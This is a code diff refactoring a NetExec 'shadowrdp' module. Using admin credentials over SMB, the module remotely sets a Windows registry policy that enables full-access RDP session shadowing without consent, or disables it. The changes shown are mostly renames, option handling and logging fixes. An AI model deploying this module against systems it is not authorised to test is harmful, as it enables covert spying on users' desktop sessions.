@@ -7,7 +7,7 @@ from nxc.helpers.misc import CATEGORY
 # Enables or disables shadow RDP
 class NXCModule:
     name = "shadowrdp"
-    description = "Enables or disables shadow RDP"
+    description = "Enables or disables Shadow RDP"
     supported_protocols = ["smb"]
     category = CATEGORY.PRIVILEGE_ESCALATION
 
@@ -21,9 +21,10 @@ class NXCModule:
 
     def __init__(self, context=None, module_options=None):
         self.context = context
-        self.action = module_options
+        self.enable = module_options.enable
+        self.disable = module_options.disable
 
-    def on_admin_login(self, context, connection):
+    def on_admin_login(self, _, connection):
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
@@ -31,31 +32,27 @@ class NXCModule:
                 ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
                 regHandle = ans["phKey"]
 
-                keyHandle = rrp.hBaseRegOpenKey(
-                    remoteOps._RemoteOperations__rrp,
-                    regHandle,
-                    "Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\\"
-                )["phkResult"]
+                reg_key_path = r"Software\Policies\Microsoft\Windows NT\Terminal Services"
+                keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, reg_key_path)["phkResult"]
 
                 # Checks if the key already exists or not
                 try:
                     rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00")
                 except Exception as e:
                     if "ERROR_FILE_NOT_FOUND" in str(e):
-                        context.log.debug("here")
                         ans = rrp.hBaseRegCreateKey(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00")
 
-                # Disable remote UAC
-                if self.module_options.disable:
+                # Disable Shadow RDP
+                if self.disable:
                     rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00", rrp.REG_DWORD, 0)
-                    context.log.highlight("Shadow RDP disabled")
+                    self.context.highlight("Shadow RDP disabled")
 
-                # Enable remote UAC
-                if self.module_options.enable:
+                # Enable Shadow RDP
+                if self.enable:
                     rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00", rrp.REG_DWORD, 2)
-                    context.log.highlight("Shadow RDP with full access enabled")
+                    self.context.highlight("Shadow RDP with full access enabled")
 
         except Exception as e:
-            context.log.debug(f"Error {e}")
+            self.context.debug(f"Error {e}")
         finally:
             remoteOps.finish()
